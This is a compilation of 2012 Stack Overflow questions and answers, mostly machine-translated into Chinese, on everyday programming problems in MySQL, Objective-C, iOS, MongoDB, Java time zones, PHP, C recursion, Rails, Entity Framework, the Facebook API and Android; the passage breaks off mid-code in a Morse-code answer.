# .net - 找不到 MySQL + .net 的错误

> ID：10772881
> 
> 赞同：0
> 
> 时间：2012-05-27T09:16:35.487
> 
> 标签：.net, mysql

错误信息：

您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以在第 1 行的 'desc) VALUES('223', 'hhh')' 附近使用正确的语法

如果我从查询中删除“desc”，那么它的代码正在运行。所以我相信代码/查询没有任何问题。

这就是我设计前端和 MySQL 的方式

txtTitle 是单行文本框，txtDesc 是多行文本框

我将标题设置为 VARCHAR(45) 并将 desc 设置为 VARCHAR(1000) 这是我的代码：

```
string connectionString = @"server=max-5.com.my;userid=user; password=123456;database=myDatabase";

MySqlConnection conn = new MySqlConnection(connectionString);

MySqlCommand cmd = conn.CreateCommand();

cmd.Parameters.Add("title", MySqlDbType.VarChar);

cmd.Parameters["title"].Value = this.txtTitle.Text;

cmd.Parameters.Add("desc", MySqlDbType.VarChar);

cmd.Parameters["desc"].Value = Server.HtmlEncode(this.txtDesc.Text);

cmd.CommandText = "INSERT INTO application(title, desc) VALUES(@title, @desc)";

conn.Open();

int numberOfRows = cmd.ExecuteNonQuery();

conn.Close();

Response.Redirect("Page2.aspx"); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T09:19:18.727

您正在使用`desc`作为字段名称，这是一个保留关键字。在查询中使用反引号：

```
cmd.CommandText = "INSERT INTO application(title, `desc`) VALUES(@title, @desc)"; 
```

或者，重命名该字段。

# objective-c - Objective C typedef枚举内存管理

> ID：10772884
> 
> 赞同：2
> 
> 时间：2012-05-27T09:17:15.627
> 
> 标签：objective-c, memory-management, enums, dealloc, alloc

处理枚举时是否必须注意内存？这是我声明我的枚举类型的地方。它在另一个 .h 文件中这是我尝试声明变量的地方
在那之后我是否要做类似的事情

```
// This is where I declared my enum type. It is in another .h file

    typedef enum CardTypes
    {
        HEART = 1,
        DIAMOND =2,
        CLUB =3,
        SPADE = 4

    } CardType;

    // This is where I attempt to declare variable  

    CardType cardType=SPADE;

    //or

    CardType cardType=malloc(size(CardType));

    // After that Do I have o do something like that

    [cardType release]

    //or

     free(&card)

     Any help will be appreciated , thanks 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T09:20:34.967

This is just a basic C type - and it's handled just like an `int` in this regard.

This is automatic:

```
CardType cardType=SPADE; 
```

But when you find you must use `malloc`, then you would need to `free` it.

Typically (e.g. parameter, ivar, local variable), you would declare the enum by value, but (like `int`) you may occasionally need to use `malloc`+`free`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T09:35:56.757

CardType type = SPADE - 在堆栈上分配内存（不需要内存管理）

CardType *type = malloc(sizeof(CardType)) - 在堆上分配内存（提到指针 *），因为显式分配，您负责使用 free(type) 释放内存

# iphone - 在 UINavigation 栏中隐藏 BackButton

> ID：10772885
> 
> 赞同：0
> 
> 时间：2012-05-27T09:17:20.997
> 
> 标签：iphone, ios, uinavigationcontroller, uinavigationitem

我正在推动 View om RootView 控制器，我得到带有后退按钮的导航栏，该按钮导航到 rootviewcontoller，但我不需要这个后退按钮。我在 viewcontoller 中噘嘴这个代码来隐藏后退按钮

```
self.navigationItem.hidesBackButton = YES; 
```

所以我得到了隐藏的后退按钮，但这是问题所在，我需要leftnavigationbar按钮来显示一些东西，当我编写上面的代码时，letbarbutton也从视图中隐藏起来。因为leftbarbutton充当后退按钮。

我的需要是在从 rootviewcontroller 推送时阻止 letbarbutton 成为后退按钮，我不需要导航回到 rootviewcontoller。但是我需要在视图中需要 leftbarbutton。

怎么可能呢？请帮我做这件事。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T09:36:38.983

试试这个。

```
self.navigationItem.backBarButtonItem = nil; 
```

这个对我有用

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T09:22:24.940

为什么不直接设置 letbarbutton 并且不添加任何操作呢？

# objective-c - How to use two or more NSFetchedResultsController?

> ID：10772890
> 
> 赞同：0
> 
> 时间：2012-05-27T09:18:33.697
> 
> 标签：objective-c, core-data

My app use CoreData. It has a UISegmentedControl and a tableview. The UISegmentedControl is used to update tableview based on different criteria.

The 1st option of UISegmentedControl will show all data in a single tableview section. So I use the following code in - (NSFetchedResultsController*)fetchedResultsController

```
frc = [[NSFetchedResultsController alloc] initWithFetchRequest:fetchRequest
                                          managedObjectContext:[self managedObjectContext] 
                                          sectionNameKeyPath:nil
                                          cacheName:@"Root"]; 
```

The 2nd option will show data in multiple tableview section. So I need NSSortDescriptor and set sectionNameKeyPath.

```
NSSortDescriptor *sortDescriptor = [[NSSortDescriptor alloc] initWithKey:@"city" 
                                                             ascending:YES];
NSArray *sortDescriptors = [[NSArray alloc] initWithObjects:sortDescriptor, nil];
[fetchRequest setSortDescriptors:sortDescriptors];

NSFetchedResultsController *frc = nil;
frc = [[NSFetchedResultsController alloc] initWithFetchRequest:fetchRequest 
                                          managedObjectContext:[self managedObjectContext] 
                                          sectionNameKeyPath:@"city" 
                                          cacheName:@"Root"]; 
```

Because sectionNameKeyPath is different which each of them need different NSSortDescriptor, I assume I need two different NSFetchedResultsController.

The code I use to reload tableview:

```
- (void) touchDownAtSegmentIndex:(NSUInteger)segmentIndex{

NSPredicate *predicate;
NSError *error;    

[NSFetchedResultsController deleteCacheWithName:@"Root"];

if(segmentIndex == 0)
{

}
else if(segmentIndex == 1)
{

}
else
{
    return;
}

[[[self fetchedResultsController] fetchRequest] setPredicate:predicate];
[[self fetchedResultsController] performFetch:&error];
[[self tableView] reloadData];
} 
```

Anyone can provide me a sample of code that use two NSFetchedResultsController. Thank you.

**SOLUTION:**

In addition from @iTukker idea, I added more checking before returning `fetchedResultsController`. Without this checking, this method will return `fetchedResultsController` instead of executing `switch .. case ..` statement.

```
- (NSFetchedResultsController*)fetchedResultsController {

.....
    if ((fetchedResultsController!= nil) && [self.segmentChanged isEqualToString:@"false"])
    return fetchedResultsController;
.....

    if (frc == nil) {
        switch (segmentendControl.selectedSegmentIndex) {
           case 0: {
               frc = ... //first frc
               [frc retain];
               break;
           }
           case 1: {
               frc = ... //second frc
               [frc retain];
               break;
           }
        }
    }

....

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T09:31:22.910

假设 frc 是控制器的实例变量，您会做的是这样的事情

```
- (NSFetchedResultsController*)fetchedResultsController {
   if (frc == nil) {
      switch (segmentendControl.selectedSegmentIndex) {
         case 0: {
             frc = ... //first frc
             [frc retain];
             break;
         }
         case 1: {
             frc = ... //second frc
             [frc retain];
             break;
         }
      }
   }

   return frc;
} 
```

当你的 segmentedController 的值改变时

```
[frc release];
frc = nil;
[tableView reloadData]; 
```

希望这是有道理的

# mongodb - Saving and reverting revision history on a database record

> ID：10772898
> 
> 赞同：-1
> 
> 时间：2012-05-27T09:20:20.690
> 
> 标签：mongodb, diff, wiki, database

I'm planning on building site that allows users to add, edit and delete records depending on their status, not that dissimilar from Stack Overflow. Any user should be able to edit records like a wiki, but to avoid sabotage all revisions must be saved so that we can revert back if need be.

I imagine there are several ways you could do this. How do sites like Wikipedia and Stack Overflow manage this type of data?

PS. I am using MongoDB for data persistence.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T09:26:10.243

你有两个正交的选择。

### 贮存

1.  将历史记录保存在同一个文档中，保存在字段名称`versions`（或其他）中。

2.  将更改保存到单独的集合以保持原始文档的清洁。

### 格式

1.  逐字保存原始版本。这有助于回滚（只需获取上一个版本并覆盖当前版本）。
2.  仅存储修改过的字段，这将为您节省一些空间（添加/删除字段时要小心）。

    2.1。为了进一步节省空间，您可以存储字符串值的差异。

# java - Changing time zone after getting GMT time from database - MonetDB

> ID：10772901
> 
> 赞同：1
> 
> 时间：2012-05-27T09:20:43.467
> 
> 标签：java, jdbc, timezone, timestamp, monetdb

I have MonetDB database with table containing user table:

```
CREATE TABLE user
(
    birth_date TIMESTAMP NOT NULL
); 
```

`birth_date` is saved in GMT without DST. (This is the default behavior of MonetDB). So I should change the `TimeZone` in my application. Here is my code:

```
Class.forName("nl.cwi.monetdb.jdbc.MonetDriver");
Connection con = DriverManager.getConnection("jdbc:monetdb://localhost/online", "monetdb", "monetdb");      
Statement st = con.createStatement();
ResultSet rs;

rs = st.executeQuery("SELECT * FROM user");
while (rs.next()) {
    Calendar c = Calendar.getInstance(TimeZone.getTimeZone("Asia/Tehran"));
    c.setTime(rs.getTimestamp("birth_date"));
    System.out.println(c.get(Calendar.YEAR) + "-" + c.get(Calendar.MONTH) + "-" + c.get(Calendar.DAY_OF_MONTH) + " " + c.get(Calendar.HOUR_OF_DAY) + ":" + c.get(Calendar.MINUTE) + ":" + c.get(Calendar.SECOND));
} 
```

But this code print the same `TIMESTAMP` in the database. Is this the wrong way to convert `TimeZone`? I'm using MonetDB version 11.9.5-20120516 on Debian 6 with openjdk 6\. Here is the `monetdbd getall /home/dbfarm`:

```
dbfarm           /home/dbfarm/
status           monetdbd[4187] 1.6 (Apr2012-SP1) is serving this dbfarm
mserver          /usr/bin/mserver5
logfile          /home/dbfarm//merovingian.log
pidfile          /home/dbfarm//merovingian.pid
sockdir          /tmp
port             50000
exittimeout      60
forward          proxy
discovery        yes
discoveryttl     600
control          yes
passphrase       {SHA512}ba3253876aed6bc22d4a6ff53d8406c6ad864195ed144ab5c87621b6c233b548baeae6956df346ec8c17f5ea10f35ee3cbc514797ed7ddd3145464e2a0bab413
mapisock         /tmp/.s.monetdb.50000
controlsock      /tmp/.s.merovingian.50000 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-28T04:26:12.217

最后我得到了答案。

MonetDB`GMT`默认运行，因为`Asia/Tehran`在数据库配置中不可用，所以我需要`Asia/Tehran`在我的应用程序中将时间转换为时区。JVM 采用操作系统的默认值`TimeZone`，我的操作系统设置为`Asia/Tehran`. 因此，该程序`Asia/Tehran`默认运行并在代码中再次将其更改为“亚洲/德黑兰”并没有任何好处。我所做的是：

1.  `TimeZone`将JVM的默认值更改为`UTC`应用程序启动时。
2.  从数据库中检索记录
3.  更改`TimeZone`为`Asia/Tehran`

这是代码：

```
/* Change the default TimeZone of JVM */
TimeZone.setDefault(TimeZone.getTimeZone("UTC")); 
Calendar c = Calendar.getInstance();
Class.forName("nl.cwi.monetdb.jdbc.MonetDriver");
Connection con = DriverManager.getConnection("jdbc:monetdb://localhost/online", "monetdb", "monetdb");
Statement st = con.createStatement();
ResultSet rs;
rs = st.executeQuery("SELECT * FROM user");
/* In each iteration:
 * 1\. set TimeZone to UTC
 * 2\. fetch record
 * 3\. convert to Asia/Tehran and so on ... */
while (rs.next()) {
    c.setTimeZone(TimeZone.getTimeZone("UTC"));
    c.setTime(rs.getTimestamp("birth_date"));
    System.out.println(c); /* This is original values in the database */
    c.setTimeZone(TimeZone.getTimeZone("Asia/Tehran"));
    System.out.println(c); /* This is the values I'm looking for */
} 
```

请注意，没有`TimeZone.setDefault(TimeZone.getTimeZone("UTC"));`这个是行不通的。因为 JDBC 已经连接到数据库并将时间转换为`TimeZone`JVM 的默认值（`Asia/Tehran`在这种情况下），然后您才能进行任何转换。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T10:32:04.443

您如何确定从 monetdb 返回的时间？

我使用了以下代码，它使用 a `Date`，而不是 a `java.sql.Timestamp`，并且它适当地从一个时区转换为另一个时区，那么是否有可能自动将时间从 UTC 转换为本地时间？

```
 Date d = new Date();
    Calendar c = Calendar.getInstance(TimeZone.getTimeZone("Asia/Tehran"));
    c.setTime(d);
    System.out.println(c.get(Calendar.YEAR) + "-" + c.get(Calendar.MONTH) + "-" + c.get(Calendar.DAY_OF_MONTH) + " " + c.get(Calendar.HOUR_OF_DAY) + ":" + c.get(Calendar.MINUTE) + ":" + c.get(Calendar.SECOND));
    c.setTimeZone(TimeZone.getTimeZone("UTC"));
    System.out.println(c.get(Calendar.YEAR) + "-" + c.get(Calendar.MONTH) + "-" + c.get(Calendar.DAY_OF_MONTH) + " " + c.get(Calendar.HOUR_OF_DAY) + ":" + c.get(Calendar.MINUTE) + ":" + c.get(Calendar.SECOND)); 
```

**编辑**如果您的 java 配置错误，尝试获取时区可能会失败；在与 GMT 相同的时区产生输出，因此您应始终确保获得正确的时区

```
TimeZone tz = TimeZone.getTimeZone("Asia/Tehran");
System.out.println(tz.toString()); 
```

为我展示`sun.util.calendar.ZoneInfo[id="Asia/Tehran",offset=12600000,dstSavings=3600000,useDaylight=true,transitions=100,lastRule=java.util.SimpleTimeZone[id=Asia/Tehran,offset=12600000,dstSavings=3600000,useDaylight=true,startYear=0,startMode=1,startMonth=2,startDay=21,startDayOfWeek=0,startTime=0,startTimeMode=0,endMode=1,endMonth=8,endDay=21,endDayOfWeek=0,endTime=0,endTimeMode=0]]`；尽管：

```
TimeZone tz = TimeZone.getTimeZone("Asia/fred");
System.out.println(tz.toString()); 
```

显示器`sun.util.calendar.ZoneInfo[id="GMT",offset=0,dstSavings=0,useDaylight=false,transitions=0,lastRule=null]`

# php - mysql rows in individual rows

> ID：10772902
> 
> 赞同：0
> 
> 时间：2012-05-27T09:20:51.537
> 
> 标签：php, html, css, row

i have a litte problem! i want to fetch the last 3 rows from my mysql database.. (works)

```
<?php
$sql = "SELECT id,title,description FROM news ORDER BY `id` DESC LIMIT 0, 3";
$result = mysql_query($sql);
while ($list = mysql_fetch_assoc($result)) 
{
?>
    <div class="one-of-three">
        <div class="box">
            <h2><?PHP echo ($list['id']);?> <?PHP echo (htmlentities($list['title'],ENT_QUOTES,'UTF-8'));?></h2>
            <div class="content clearfix">
                <p><?PHP echo (htmlentities($list['description'],ENT_QUOTES,'UTF-8'));?></p>
            </div>
        </div>
    </div>
<?php
}
?> 
```

my problem is the html layout! i have 3 div boxes wich i will float..

```
 <div class="one-of-three">
        [...]
    </div>
    <div class="two-of-three">
        [...]
    </div>
    <div class="three-of-three">
        [...]
    </div> 
```

but my result gives me

```
 <div class="one-of-three">
        [...]
    </div>
    <div class="one-of-three">
        [...]
    </div>
    <div class="one-of-three">
        [...]
    </div> 
```

i tried different things but i dont how it works :( you can give me a hint?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T09:33:45.477

```
<?php
 $n = array(1 => 'one', 2 => 'two', 3 => 'three');
 while ($list = mysql_fetch_assoc($result)) {
?>
    <div class="<?php echo $n[$list['id']]; ?>-of-three"> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T09:25:24.983

你可能应该得到一个数组`$numbers = array('one', 'two', 'three');`。然后有一个变量`$i = 0;`并在循环中增加它。第一行应该是这样的：`<div class="<?php echo $numbers[$i++]; ?>-of-three">`.

# php - PHP to calculate latest 31 March

> ID：10772903
> 
> 赞同：0
> 
> 时间：2012-05-27T09:20:54.357
> 
> 标签：php, date, financial

i want to calculate latest 31-Mar .... suppose date is 1-Jan-2012 i want result as 31-mar-2011 and if is 1-April-2011 then also i want result 31-mar-2011 and if its 1-mar-2011 it should come as 31-mar-2010.....hope i made my self clear ...(with php) ... i al calculating date with this for financial year ... `always between 31-mar-lastyear to 1-April-thisyear` ... year should be taken automatically ... i was trying like this

```
31-mar-date('y') and 31-mar-date('y')-1 
```

but its not working as its taking current year every time.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T09:34:17.553

像这样的东西：

```
function getLast() {
    $currentYear = date('Y');

    // Check if it happened this year, AND it's not in the future.
    $today = new DateTime();
    if (checkdate(3, 31, $currentYear) && $today->getTimestamp() > mktime(0, 0, 0, 3, 31, $currentYear)) {
        return $currentYear;
    }

    while (--$currentYear) {
        if (checkdate(3, 31, $currentYear)) {
            return $currentYear;
        }
    }

    return false;
}

var_dump(getLast()); 
```

它应该返回年份或`false`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T09:49:29.080

这是一个使用php奇妙的[strtotime函数的示例。](http://php.net/manual/en/function.strtotime.php)

```
<?php

$day = 1;
$month = 1;
$year = 2011;

$date = mktime(12, 0, 0, $month, $day, $year);

$targetMonth = 3;
$difference = $month - $targetMonth;

if($difference < 0) {
    $difference += 12;
}

$sameDateInMarch = strtotime("- " . $difference . " months", $date);

echo "Entered date: " . date("d M Y", $date) . "<br />";
echo "Last 31 march: " .  date("t M Y", $sameDateInMarch);

// the parameter 't' displays the last day of the month
?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-12-07T07:10:04.027

```
if (date('m')>3) {
    $year = date('Y').'-'.(date('Y')+1);
} else {
    $year = (date('Y')-1).'-'.date('Y');
}
echo $year; 
```

这是为了获得印度当前的财政年度

# php - PHP log in error undefined index

> ID：10772904
> 
> 赞同：0
> 
> 时间：2012-05-27T09:20:56.980
> 
> 标签：php, android, login, indexing

I am trying to log in using this code :

```
session_start();

require "connect.php";

$username = $_POST['username'];
$password = $_POST['password'];

  if($username&&$password)
 {
$query = mysql_query("SELECT * FROM users WHERE username='$username'");
$numrow = mysql_num_rows($query);

if($numrow!=0)
{
    while($row = mysql_fetch_assoc($query))
    {
        $db_username = $row['username'];
        $db_password = $row['password'];
    }

    if($username==$db_username&&$password==$db_password)
    {
        //echo 1;
        header("Location: members.php");
        $_SESSION['username']=$db_username;

    }
    else echo 0;
}
else die("That user doesn't exist");
    }
     else die("Please enter a username and password"); 
```

upon successful log in it should take me to members.php :

```
 session_start();
 if($_SESSION['username'])  <------ this is line 5
   {
echo "20730312";
echo " You are logged in as: ".$_SESSION['username'];
echo "<p><a href='logout.php'>Click here to logout</a>";
    } 
```

but when i request members.php in my application it gives me :

```
Notice: Undefined index: username in E:\Program Files\xampp\htdocs\adddrop\members.php on line 5 
```

note that i am using android webview to request members.php after successful log in, is this right ? what am i doing wrong ?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T09:23:46.853

附带说明：那里有一个 SQL 注入。可能想阅读更多：[http ://en.wikipedia.org/wiki/SQL_injection](http://en.wikipedia.org/wiki/SQL_injection)

您面临的问题是用户名并不总是已发布（当您第一次加载页面时）：

```
$username = isset($_POST['username']) ? $_POST['username'] : null;
$password = isset($_POST['password']) ? $_POST['password'] : null; 
```

那应该解决它。基本上，我检查是否设置了 POST 索引，并且只有当我尝试访问它时才尝试访问它，否则我将其设置为`null`.

此外，您可能希望这样做：

```
$query = mysql_query("SELECT * FROM users WHERE username='" . mysql_real_escape_string($username) . "'"); 
```

这可以防止 SQL 注入漏洞。

并添加`exit;`：

```
header("Location: members.php");
$_SESSION['username']=$db_username;
exit; // Add this. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T09:22:27.040

Same as always. You're not POSTing to the URL. Verify the URL you're attempting to POST to.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T10:02:10.723

正如它所说，您没有来自 POST 的指定数据。确保您的表单操作正确并且您正在填写用户名。

此外，您可能需要考虑对密码进行哈希处理。从我在这里可以看到，您可以比较纯文本密码（或者您已经在脚本中获得了散列密码，这没关系）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-27T09:53:31.140

也许是这样：

```
header("Location: members.php");
$_SESSION['username']=$db_username; 
```

应改为（反向）：

```
$_SESSION['username']=$db_username;
header("Location: members.php"); 
```

# c - recursive functions in C: is return always necessary?

> ID：10772906
> 
> 赞同：3
> 
> 时间：2012-05-27T09:21:31.550
> 
> 标签：c

this is my first time playing with recursive functions, and this function that I wrote returns the size of a string if it contains only letters in ascending order, and if not it returns -1\.

I don't understand why it works for both codes, after I took out the second "return". Is one more wasteful than the other? Would appreciate some insight.

with "**return** only_ascending_letters(string, index+1);"

```
 #include <stdio.h>

    int only_ascending_letters(char string[], int index);

    void main() {
        char string1[]="Hi my name is pete";
        char string2[]="aabcdefg";

        printf("the first string is %d and the second one is %d\n",only_ascending_letters(string1,0),only_ascending_letters(string2,0));

    }

    int only_ascending_letters(char string[], int index){
        if(!string[index]) return index;
        if(((string[index]>='a'&&string[index]<='z')||(string[index]>='A'&&string[index]<='Z'))&&((string[index]<=string[index+1])||!string[index+1])) 
            return only_ascending_letters(string, index+1);
        else return -1;

    } 
```

with "only_ascending_letters(string, index+1);"

```
 #include <stdio.h>

    int only_ascending_letters(char string[], int index);

    void main() {
        char string1[]="Hi my name is pete";
        char string2[]="aabcdefg";

        printf("the first string is %d and the second one is %d\n",only_ascending_letters(string1,0),only_ascending_letters(string2,0));

    }

    int only_ascending_letters(char string[], int index){
        if(!string[index]) return index;
        if(((string[index]>='a'&&string[index]<='z')||(string[index]>='A'&&string[index]<='Z'))&&((string[index]<=string[index+1])||!string[index+1])) 
        /*Took out the return*/ only_ascending_letters(string, index+1);
        else return -1;

    } 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-27T09:25:57.900

是的，您绝对*需要*退货。请注意，C 语言规则对这个问题有点松懈，如果你没有使用返回值，没有它也可以。但是，您使用返回值，因此您需要 return 语句。

您看到的可能是由于某些架构上的函数通过将众所周知的寄存器设置为该值（i386 上的 eax）返回的实现细节（整数值）引起的。因此，如果最底层的递归调用确实`return`设置了这个寄存器，并且中间的调用没有踩到那个寄存器，你会看到它有点工作。但是，您不能依赖它。

请注意，好的编译器会识别出这是一个尾递归调用，并以基本相同的方式编译这两个变体。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T09:51:32.917

首先，`main()`返回一个int（实际上是与int兼容的类型）。

其次，您应该更多地格式化您的代码。空格是你的朋友，换行符也是。很难判断没有返回的代码是否真的正确，因为大部分代码都跑出了屏幕。

第三，您应该始终启用所有 [reasonable] 警告。这样做会捕获丢失的返回条件，以及`void main()`.

至于答案，@jpalecek 做得很好。我只想补充一点，未定义的行为是一种野兽。如果你依赖它，一个“工作”的程序可能会因为你决定再次编译它、在运行它时播放一些音乐或者月相改变而停止这样做。

我在 [99] 标准中只能找到**§6.9.1 第 12 条**：

> 如果到达终止函数的}，并且调用者使用了函数调用的值，则行为未定义。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T09:45:58.143

你有两个退出条件。您要么跑出字符串的末尾，在这种情况下，满足升序字符的条件并返回字符串的长度，要么找到未通过升序测试的字符，在这种情况下，您返回 -1。

不从对递归函数的调用中返回值可能适用于编译器的某些实现，但使用不同的编译器或不同的优化标志，它可能不起作用，因此您应该在代码中保留返回。

# ruby-on-rails-3 - Render page doesn’t exist Like Twitter in rails 3

> ID：10772910
> 
> 赞同：0
> 
> 时间：2012-05-27T09:21:52.500
> 
> 标签：ruby-on-rails-3, twitter, rendering, http-status-code-404

How do I render a 404 or page doesn't exist like Twitter does? I use rails 3.2.3

My code

```
def rescue_with_handler(exception)
  redirect_to '/500.html'
end

def method_missing(id, *args)
 redirect_to '/404.html'
end 
```

That works, but I want to be like twitter. For example if I access this page [https://twitter.com/abcd/skka/asafaga](https://twitter.com/abcd/skka/asafaga) and [https://twitter.com/abcd/skka](https://twitter.com/abcd/skka)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T09:30:30.727

你必须`Routing Error`处理`rescue_from`.

这个问题已经回答了：

*   [Rails 3 中的动态错误页面](https://stackoverflow.com/questions/5331008/dynamic-error-pages-in-rails-3)
*   [使用 DataMapper get 在 Rails3 控制器中处理 404 的最佳方法](https://stackoverflow.com/questions/3515263/best-way-to-handle-404-in-rails3-controllers-with-a-datamapper-get)
*   [rescue_from NoMethodError](https://stackoverflow.com/questions/3632224/rescue-from-nomethoderror)
*   ...

这里也有解决方案：

*   [https://github.com/rails/rails/issues/671](https://github.com/rails/rails/issues/671)

无论如何，尝试谷歌它，你会发现很多不同的解决方案。

# c# - Code First Entity Framework 不允许访问表

> ID：10772912
> 
> 赞同：0
> 
> 时间：2012-05-27T09:22:16.043
> 
> 标签：c#, asp.net, asp.net-mvc, entity-framework, ef-code-first

我正在尝试首先使用代码为 asp.net mvc 应用程序生成数据库。OrderItem 类确实生成为数据库中的 OrderItems 表，但我最终无法访问它。我该怎么做才能允许以下例如：`db.OrderItems.Find(id);`

模型如下：

```
namespace CustomerOrders.Models{

public class Customer
{

    public virtual int  CustomerID { get; set; }
    public virtual string FirstName { get; set; }
    public virtual string LastName { get; set; }
    public virtual string Company { get; set; }
    public virtual string Email { get; set; }
    public virtual string EmailCheck { get; set; }
}

public class Order
{
    public virtual int OrderID { get; set; }
    public virtual int CustomerID { get; set; }
    public virtual DateTime OrderDate { get; set; }
    public virtual double OrderTotal { get; set; }
    public virtual double Tax { get; set; }
    public virtual Customer Customer { get; set; }
    public virtual List<OrderItem> OrderItems { get; set; }
}

public class OrderItem
{
    public virtual int OrderItemID { get; set; }
    public virtual int OrderID { get; set; }
    public virtual int ProductID { get; set; }
    public virtual double PricePerItem { get; set; }
    public virtual double Quantity { get; set; }
    public virtual Product Product { get; set; }
    public Order Order { get; set; }
}

public class Product
{
    public virtual int ProductID { get; set; }
    public virtual string Title { get; set; }
    public virtual string Description { get; set; }
    public virtual double Price { get; set; }
}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T09:40:23.367

您可能在 dbContext 中没有声明，因此打开 dbContext 并添加以下内容： `public DbSet<OrderItem> OrderItems { get; set; }`

你应该得到这个：

```
public class CustomerOrdersDB : DbContext
{
    public DbSet<Order> Orders { get; set; }

    public DbSet<Customer> Customers { get; set; }

    public DbSet<Product> Products { get; set; }

    public DbSet<OrderItem> OrderItems { get; set; }
} 
```

# javascript - Error in Facebook sample login application

> ID：10772914
> 
> 赞同：-2
> 
> 时间：2012-05-27T09:22:24.703
> 
> 标签：javascript, facebook-graph-api

I have this code I got it from facebook developers and when I click on button read I have problem always return this message to me (error occured):

```
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US"
  xmlns:fb="https://www.facebook.com/2008/fbml"> 
<head prefix="og: http://ogp.me/ns# subhinajjar: 
              http://ogp.me/ns/apps/subhinajjar#">
<title>OG Tutorial App</title>
<meta property="fb:app_id" content="*****" /> 
<meta property="og:type" content="subhinajjar:article" /> 
<meta property="og:title" content="3eesho reading club" /> 
<meta property="og:url" content=document.location.href>

<script type="text/javascript">

function postarticle()
{
  FB.api(
    '/me/subhinajjar:read?article',
    'post',
    { article: 'document.location.href' },
    function(response) {
       if (!response || response.error) {
          alert('Error occured');
       } else {
          alert('read was successful! Action ID: ' + response.id);
       }
    });
}
</script>
</head>
<body>
<div id="fb-root"></div>
<script>
window.fbAsyncInit = function() {
  FB.init({
    appId      : '*****', // App ID
    status     : true, // check login status
    cookie     : true, // enable cookies to allow the server to access the session
    xfbml      : true  // parse XFBML
  });
};

// Load the SDK Asynchronously
(function(d){
  var js, id = 'facebook-jssdk'; if (d.getElementById(id)) {return;}
  js = d.createElement('script'); js.id = id; js.async = true;
  js.src = "//connect.facebook.net/en_US/all.js";
  d.getElementsByTagName('head')[0].appendChild(js);
}(document));
</script>
</p>

<br>
<form>
<div class="fb-login-button" data-show-faces="true" data-width="200" data-max-rows="1"                                     scope="publish_action"></div>
<input type="button" value="read" onclick="postarticle()" /> 
```

It always return this message (error occured) why?

And what does function response mean?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T12:53:05.777

您应该解析 response.error 或将其记录到控制台。

乍一看`/me/subhinajjar:read?article`应该是`/me/news.reads`

和`<meta property="og:type" content="subhinajjar:article" />`

应该`<meta property="og:type" content="article">`

所以最有可能的错误是

> 未知路径组件

# android - 谷歌地图使用 WiFi 更新，但不使用 3G

> ID：10772918
> 
> 赞同：0
> 
> 时间：2012-05-27T09:22:46.337
> 
> 标签：android, google-maps, gps, wifi, 3g

我制作了一个应用程序来确定位置（气球）并将其显示在 Google 地图上（包括道路、城市等），因此需要活跃的互联网。当我使用 WiFi 但不是 3G 时，这可以正常工作。它确定位置和位置输出到谷歌地图是好的（包括一个气球），但地图（包括道路、河流、城市等）不会更新。

特此我的清单设置：

```
<uses-library android:name="com.google.android.maps" />
</application>  
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_LOCATION_EXTRA_COMMANDS" />
<uses-permission android:name="android.permission.ACCESS_MOCK_LOCATION" />
<uses-permission android:name="android.permission.CONTROL_LOCATION_UPDATES" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-28T14:44:04.727

我自己解决了这个问题，但方法如下：在网上阅读了几篇文章后，似乎出现了某种 api key 错误。我读到调试密钥和签名密钥有所不同，所以我用签名的 api 密钥替换了调试密钥，这就成功了。
为什么 wifi 可以工作而 3G 不行，我不清楚，我真的不介意，因为现在一切正常

# c++ - 从字符串中读取每个莫尔斯电码

> ID：10772921
> 
> 赞同：-6
> 
> 时间：2012-05-27T09:23:15.827
> 
> 标签：c++

嗨，我有用空格分隔的字符串莫尔斯电码，例如 `*** --- ***`SOS 。

谁能帮我阅读每个莫尔斯电码？

目前，我正在读取需要读取每个莫尔斯电码的每个字符，以便可以将莫尔斯电码作为变量传递给返回字母字符的其他方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T10:27:03.787

您可以使用[strtok](http://www.cplusplus.com/reference/clibrary/cstring/strtok/)来标记字符串并使用空格字符作为分隔符。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T11:06:56.760

您可以将莫尔斯电码及其等效值存储在地图中，将莫尔斯字符串拆分为空格，遍历这些元素并从地图中检索结果值（并将它们连接在一起）以获得最终结果

这是一个显示解码的 SOS '... --- ...' 的示例

```
#include <string>
#include <cstring>
#include <iostream>
#include <map>
#include <vector>

